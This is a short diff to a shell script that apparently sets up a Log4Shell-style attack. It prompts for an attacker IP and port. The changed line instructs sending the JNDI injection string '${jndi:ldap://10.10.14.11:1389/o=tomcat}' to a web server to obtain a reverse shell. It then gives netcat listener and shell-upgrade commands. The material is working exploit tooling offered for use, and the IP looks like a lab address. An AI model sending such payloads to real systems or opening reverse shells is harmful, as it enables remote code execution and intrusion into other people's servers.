@@ -14,7 +14,7 @@ echo "my ip:"
 read my_ip
 echo "my port:"
 read my_port
-echo "Once this is complete and you've got a reverse shell, remember to use the following command within nc -lvnp (port)"
+echo "Once this is complete and you've sent the command ${jndi:ldap://10.10.14.11:1389/o=tomcat} (read this script for more o= options for different web serves) to get a reverse shell, remember to use the following command within nc -lvnp (port)"
 echo "script /dev/null -c bash"
 echo "This will help to make the shell more useable"
 echo ""
